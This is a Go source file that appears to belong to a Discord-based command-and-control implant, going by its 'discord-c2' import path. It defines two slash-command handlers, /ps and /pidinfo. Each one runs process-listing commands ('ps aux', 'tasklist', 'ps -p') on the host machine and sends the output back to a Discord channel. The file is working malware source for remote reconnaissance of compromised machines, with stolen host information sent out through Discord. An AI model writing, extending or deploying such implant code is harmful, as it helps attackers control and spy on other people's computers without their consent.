package commands

// This file contains system-information slash commands such as ps and
// pidinfo, which are implemented using platform-specific shell commands.

import (
	"fmt"
	"runtime"

	"discord-c2/internal/shell"

	"github.com/bwmarrin/discordgo"
)

// handleSlashPs lists processes using ps on Unix-like systems or tasklist on
// Windows, returning the output via shell.Run.
func handleSlashPs(s *discordgo.Session, i *discordgo.InteractionCreate) {
	cmdStr := "ps aux"
	if runtime.GOOS == "windows" {
		cmdStr = "tasklist"
	}
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: "Running: `" + cmdStr + "`",
			Flags:   discordgo.MessageFlagsEphemeral,
		},
	})
	shell.Run(s, i.ChannelID, nil, cmdStr)
}

// handleSlashPidInfo shows details about a single process ID using platform
// appropriate tooling (ps/tasklist) and validates the PID argument first.
func handleSlashPidInfo(s *discordgo.Session, i *discordgo.InteractionCreate, data discordgo.ApplicationCommandInteractionData) {
	var pidVal int64
	for _, opt := range data.Options {
		if opt.Name == "pid" {
			pidVal = opt.IntValue()
			break
		}
	}
	if pidVal <= 0 {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "Invalid PID.",
				Flags:   discordgo.MessageFlagsEphemeral,
			},
		})
		return
	}
	cmdStr := ""
	if runtime.GOOS == "windows" {
		cmdStr = fmt.Sprintf("tasklist /FI \"PID eq %d\"", pidVal)
	} else {
		cmdStr = fmt.Sprintf("ps -p %d -o pid,ppid,user,pcpu,pmem,etime,cmd", pidVal)
	}
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: "Running: `" + cmdStr + "`",
			Flags:   discordgo.MessageFlagsEphemeral,
		},
	})
	shell.Run(s, i.ChannelID, nil, cmdStr)
}
